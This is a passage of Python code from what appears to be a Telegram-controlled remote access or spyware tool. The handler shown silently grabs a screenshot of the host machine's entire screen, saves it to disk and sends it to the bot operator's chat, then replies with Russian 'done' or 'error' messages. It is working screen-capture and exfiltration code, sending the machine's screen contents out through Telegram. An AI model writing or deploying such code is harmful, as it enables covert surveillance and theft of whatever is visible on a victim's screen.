    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'typing')
    screenshot = ImageGrab.grab()
    screenshot.save('screenshot.jpg')
    with open('screenshot.jpg', 'rb') as photo:
        bot.send_document(chat_id, photo)

    try:
        error_message = f"ВЫПОЛНЕННО!!!"
        bot.send_message(chat_id, error_message)
    except PermissionError as e:
        error_message = f"ОШИБКА:: {e}"
        bot.send_message(chat_id, error_message)
    except Exception as e:
        error_message = f"ОШИБКА: {e}"
        bot.send_message(chat_id, error_message)
